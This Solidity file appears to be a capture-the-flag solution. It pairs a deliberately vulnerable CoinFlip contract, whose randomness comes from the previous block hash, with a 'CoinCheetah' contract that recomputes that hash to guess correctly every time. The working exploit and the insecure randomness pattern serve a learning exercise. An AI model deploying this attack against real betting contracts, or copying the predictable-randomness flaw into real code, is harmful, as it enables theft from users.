pragma solidity ^0.4.18;

contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}


contract CoinCheetah {
    CoinFlip public flipper;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;

    constructor (address _flipContract) public {
        flipper = CoinFlip(_flipContract);
    }

    function changeFlipper(address _newFlipper) public {
        flipper = CoinFlip(_newFlipper);
    }

    function cheat() public returns(bool) {
        uint blockValue = uint256(blockhash(block.number-1));
        uint coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;
        bool result = flipper.flip(side);
        return result;
    }
}